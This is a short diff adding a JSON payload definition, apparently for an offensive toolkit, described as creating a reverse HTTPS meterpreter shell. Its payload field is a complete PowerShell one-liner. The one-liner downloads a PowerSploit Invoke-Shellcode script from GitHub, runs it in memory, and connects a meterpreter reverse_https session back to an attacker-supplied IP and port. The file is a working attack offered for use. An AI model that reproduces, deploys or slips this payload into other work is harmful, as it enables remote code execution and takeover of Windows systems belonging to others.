@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "creates a reverse HTTPS meterpreter shell",
+      "type": "reverse",
+      "exec": "powershell"
+    },
+    "payload": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost [IP] -Lport [PORT] -Force"
+  }
+}
